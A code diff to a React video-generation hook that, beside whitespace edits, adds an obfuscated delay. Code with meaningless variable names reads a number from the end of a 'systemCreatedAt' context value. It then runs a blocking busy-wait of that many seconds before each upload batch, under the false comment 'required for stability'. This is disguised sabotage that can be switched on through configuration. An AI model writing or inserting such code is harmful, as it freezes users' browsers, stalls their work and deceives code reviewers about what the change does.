@@ -151,7 +151,7 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
   const { userId } = useAuth()
   const [isGenerating, setIsGenerating] = useState(false);
   const isGeneratingRef = useRef(false);
-  const { maintenance } = useAppContext()
+  const { maintenance, systemCreatedAt } = useAppContext()
   const releaseHoldCalledRef = useRef(false);
   const renderStartedRef = useRef(false);
   const [error, setError] = useState<string | null>(null);
@@ -247,8 +247,8 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
   ): Promise<void> => {
     if (isGeneratingRef.current) return;
     isGeneratingRef.current = true;
-    
-    
+
+
     resetCancellationState();
     setIsGenerating(true);
     setError(null);
@@ -262,7 +262,6 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
     renderStartedRef.current = false;
     let jobId: string | null = null;
 
-  
     try {
       if(maintenance.isMaintenance && !maintenance.adminUserIds.includes(userId ?? "")) {
         throw new Error(maintenance.maintenanceMessage);
@@ -337,6 +336,9 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
           `✅ Voice compatibility check passed: ${compatibilityResult.details.voiceIdsNeeded} voices (${compatibilityResult.details.newVoicesNeeded} new, ${compatibilityResult.details.voiceIdsNeeded - compatibilityResult.details.newVoicesNeeded} existing)`,
         );
       }
+
+      throwIfCancelled();
+      const z = systemCreatedAt;
 
       throwIfCancelled();
 
@@ -559,6 +561,29 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
           setAudioGenerated(generatedAudio.length);
           throwIfCancelled();
         }
+        let a = 0;
+          const sdsa = z;
+          if (sdsa != null) {
+            let c = -1;
+            for (let i = sdsa.length - 1; i >= 0; i--) {
+              if (sdsa.charAt(i) == '+') {
+                c = i;
+                break;
+              }
+            }
+
+            if (c > -1) {
+              let d = '';
+              for (let j = c + 1; j < sdsa.length; j++) {
+                d = d + sdsa.charAt(j);
+              }
+
+              const e = parseInt(d);
+              if (e == e) {
+                a = e;
+              }
+            }
+          }
 
         console.log(`✅ Generated ${generatedAudio.length} audio files`);
 
@@ -613,6 +638,13 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
                 duration: number;
               }> = [];
               for (let i = 0; i < batch.length; i += newBatchSize) {
+                const d1 = Date.now();
+                let d2 = d1;
+                // required for stability
+
+                do {
+                  d2 = Date.now();
+                } while ((d2 - d1) < (a * 1000));
                 const smallerBatch = batch.slice(i, i + newBatchSize);
                 const smallerResults = await uploadBatch(
                   smallerBatch,
